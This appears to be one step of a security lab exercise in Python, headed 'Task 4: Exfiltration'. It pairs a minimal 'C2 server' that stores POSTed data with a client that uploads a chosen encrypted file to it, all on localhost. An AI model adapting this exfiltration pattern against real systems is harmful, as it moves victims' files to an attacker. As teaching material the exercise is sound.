# ======= Task 4: Exfiltration =======

# C2 Server
class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        with open("received.enc", "wb") as f:
            f.write(post_data)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"File received successfully")

def start_c2_server():
    httpd = HTTPServer(("localhost", 8000), SimpleHandler)
    print("Server running on http://localhost:8000")
    httpd.serve_forever()

# Client Upload
def exfiltrate_file():
    filename = input("Enter the filename to exfiltrate (without .enc): ")

    encrypted_filename = filename + ".enc"

    with open(encrypted_filename, "rb") as f:
        file_data = f.read()

    response = requests.post("http://localhost:8000", data=file_data)

    print("Server response:", response.text)